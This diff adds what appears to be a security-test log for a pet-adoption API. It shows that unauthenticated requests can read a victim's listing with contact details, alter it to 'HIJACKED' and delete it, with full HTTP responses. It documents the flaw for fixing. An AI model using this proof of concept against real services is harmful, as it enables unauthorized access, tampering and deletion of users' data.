@@ -1,0 +1,44 @@
+# IDOR D - adoption listings (NO auth) read-by-owner / edit / delete
+# Attempted: GET /owner/:userId, PUT /:id, DELETE /:id with NO token
+# Expected when fixed: 401 + ownership (only the listing owner / adoption manager)
+
+# victim listing id: 6ab8b72e5c8a2e07cb2b16ac ; victim userId: 6ab8b702b53267666193741e
+
+## (1) GET /api/foradoption/owner/<victim> (no auth):
+HTTP/1.1 200 OK
+X-Powered-By: Express
+Access-Control-Allow-Origin: *
+Content-Type: application/json; charset=utf-8
+Content-Length: 383
+ETag: W/"17f-khH0/4I4jDigzPZKErJuWi0BVTA"
+Date: Sun, 27 Sep 2026 06:26:56 GMT
+Connection: keep-alive
+Keep-Alive: timeout=5
+
+[{"_id":"6ab8b72e5c8a2e07cb2b16ac","userId":"6ab8b702b53267666193741e","ownerFirstName":"Victim","ownerLastName":"Person","email":"idor_victim@example.com","phone":"0720000001","petName":"VictimCat","petAge":"2","petGender":"F","petBreed":"Tabby","petSpecies":"Cat","petDescription":"private","reason":"moving","specialNeeds":false,"vaccinated":true,"neutered":true,"petImage":null}]
+
+## (2) PUT tamper listing (no auth):
+HTTP/1.1 200 OK
+X-Powered-By: Express
+Access-Control-Allow-Origin: *
+Content-Type: application/json; charset=utf-8
+Content-Length: 419
+ETag: W/"1a3-Ja6oY5uF6tLID6wpvHYFAx4ZLaw"
+Date: Sun, 27 Sep 2026 06:26:56 GMT
+Connection: keep-alive
+Keep-Alive: timeout=5
+
+{"_id":"6ab8b72e5c8a2e07cb2b16ac","userId":"6ab8b702b53267666193741e","ownerFirstName":"Victim","ownerLastName":"Person","email":"idor_victim@example.com","phone":"0720000001","petName":"HIJACKED","petAge":"2","petGender":"F","petBreed":"Tabby","petSpecies":"Cat","petDescription":"private","reason":"moving","specialNeeds":false,"vaccinated":true,"neutered":true,"petImage":null,"updatedAt":"2026-09-27T06:26:56.508Z"}
+
+## (3) DELETE listing (no auth):
+HTTP/1.1 200 OK
+X-Powered-By: Express
+Access-Control-Allow-Origin: *
+Content-Type: application/json; charset=utf-8
+Content-Length: 51
+ETag: W/"33-sAI/C5/KWRF+LAmGVAdiJNfM6iU"
+Date: Sun, 27 Sep 2026 06:26:56 GMT
+Connection: keep-alive
+Keep-Alive: timeout=5
+
+{"message":"Adoption listing deleted successfully"}
